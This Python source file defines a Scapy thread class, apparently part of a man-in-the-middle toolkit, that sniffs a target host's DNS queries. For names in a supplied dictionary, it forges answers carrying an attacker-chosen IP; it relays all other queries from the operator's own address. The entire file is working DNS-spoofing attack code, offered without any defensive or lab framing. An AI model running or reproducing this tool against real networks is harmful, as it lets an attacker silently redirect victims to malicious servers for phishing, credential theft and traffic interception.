from scapy.all import *
from threading import Thread, Event
from Spoofer import Spoofer
from time import sleep
import netifaces


class InputDNSRequestProcessing(Thread):

    my_ip : str
    target_ip : str
    dictionnary_dns_entry_ip : dict
    stop_event : Event

    def __init__(self, target_ip : str, interface : str, dictionnary_dns_entry_ip : dict) -> None:
        Thread.__init__(self)

        print("Initialization of InputDNSRequestProcessing module")
        
        assert target_ip is not None, "InputDNSRequestProcessing - Targeted IP can't be empty"
        self.target_ip = target_ip.strip()

        assert interface is not None, "InputDNSRequestProcessing - Interface can't be empty"
        self.interface = interface.strip()

        try:
            self.my_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
        except Exception as e:
            print(f"InputDNSRequestProcessing - Own IP fetching problem on interface {interface} : {e}")

        
        assert dictionnary_dns_entry_ip is not None, "InputDNSRequestProcessing - No input entry in the dictionnary"
        self.dictionnary_dns_entry_ip = dictionnary_dns_entry_ip

        self.stop_event = Event()

    def input_dns_packet_request_target_callback(self, packet) -> None:
        if packet.haslayer(DNSQR):
            
            qrname = packet[DNSQR].qname.decode('utf-8')
            if qrname in self.dictionnary_dns_entry_ip.keys() and packet[DNS].qr == 0:
                custom_ip = self.dictionnary_dns_entry_ip[qrname]

                response = IP(src = packet[IP].dst, dst = packet[IP].src) / \
                    UDP(sport = packet[UDP].dport, dport = packet[UDP].sport) / \
                    DNS(
                    id = packet[DNS].id,  
                    qr = 1,     
                    ra = 1,     
                    qd = packet[DNSQR],
                    an = DNSRR(rrname = packet[DNSQR].qname, type = 'A', rdata = custom_ip, ttl = 3600)
                )
                send(response, count = 1, verbose = False)
            
            elif packet[DNS].qr == 0 and packet[IP].src != self.my_ip:

                request = IP(src = self.my_ip, dst = packet[IP].dst)
                copied_layer = packet.getlayer(UDP)
                copied_layer[UDP].len = None
                copied_layer[UDP].chksum = None
                request = request / copied_layer

                send(request, count = 1, verbose = False)

    def stop_sniff(self, packet) -> bool:
        return self.stop_event.isSet()

    def stop(self) -> None:
        self.stop_event.set()

    def run(self) -> None:
        sniff(filter = f"host {self.target_ip} and port 53", store = 0, prn = self.input_dns_packet_request_target_callback, stop_filter = self.stop_sniff)